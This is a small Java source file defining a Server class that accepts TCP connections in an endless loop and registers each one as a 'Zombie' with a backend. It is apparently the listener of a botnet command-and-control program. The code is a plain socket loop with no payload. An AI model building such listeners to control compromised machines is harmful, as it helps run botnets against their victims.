package Backend;

import Backend.Zombie.Zombie;

import java.io.IOException;
import java.net.ServerSocket;

public class Server implements Runnable{
    private ServerSocket serverSocket;
    private Backend backend;

    public Server(Backend backend, int port) throws IOException {
        this.serverSocket = new ServerSocket(port);
        this.backend = backend;
    }

    @Override
    public void run() {
        while(true){
            try {
                backend.AddZombie(new Zombie(this.serverSocket.accept()));
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}